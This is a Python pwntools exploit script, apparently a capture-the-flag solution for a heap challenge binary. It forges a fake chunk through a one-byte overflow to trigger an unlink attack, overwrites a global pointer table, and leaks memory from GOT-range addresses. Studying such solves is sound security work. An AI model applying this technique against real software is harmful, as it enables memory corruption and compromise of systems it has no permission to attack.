from pwn import *

s = process("./fb_noalarm")
#s = remote("121.40.56.102",9733)

def alloc(i):
	s.sendline("1")
	s.sendline("%d" % i)
	s.recvuntil("Done~")
	s.recvuntil("Choice:")

def setmsg(i,buf):
	s.sendline("2")
	s.sendline("%d" % i)
	s.sendline(buf)
	s.recvuntil("Done~")
	s.recvuntil("Choice:")

def delmsg(i):
	s.sendline("3")
	s.sendline("%d" %i)
	s.recvuntil("Done~")
	s.recvuntil("Choice:")

alloc(1)
alloc(1)
alloc(0xf8)
alloc(0xf8)
alloc(0xf8)

print "Allocs made"

ptr1 = 0x6020e0-0x18
ptr2 = 0x6020e0-0x10

buf = p64(1)

buf += p64(0x101)

buf += p64(ptr1)
buf += p64(ptr2)
buf += cyclic(0xd0)
buf += p64(0xf0)

#one byte overflow to cause consolidate
setmsg(2,buf)
print "overflowed"

delmsg(3)
print "haxed"

#blow away pointers
buf = p64(1)
ptr = 0x602018
buf += p64(ptr)+p64(0x10000)
buf += p64(0x6020c0)+p64(0x10000)

setmsg(2,buf)

#setmsg(1,p64(0x4006C0)[:-1])
setmsg(1,p64(0x12345678)[:-1])

def getmem(ptr):
	print hex(ptr)
	setmsg(2,p64(ptr)+p64(1)[:-1])
	s.sendline("3")
	s.sendline("0")
	s.recvuntil(" index:")
	out = s.recvline()
	s.recvuntil("Done~")
	s.recvline()
	return out

for ptr in xrange(0x602020,0x602060,8):
	o = getmem(ptr)[:-1]
	print hex(u64(o.ljust(8,"\x00")))
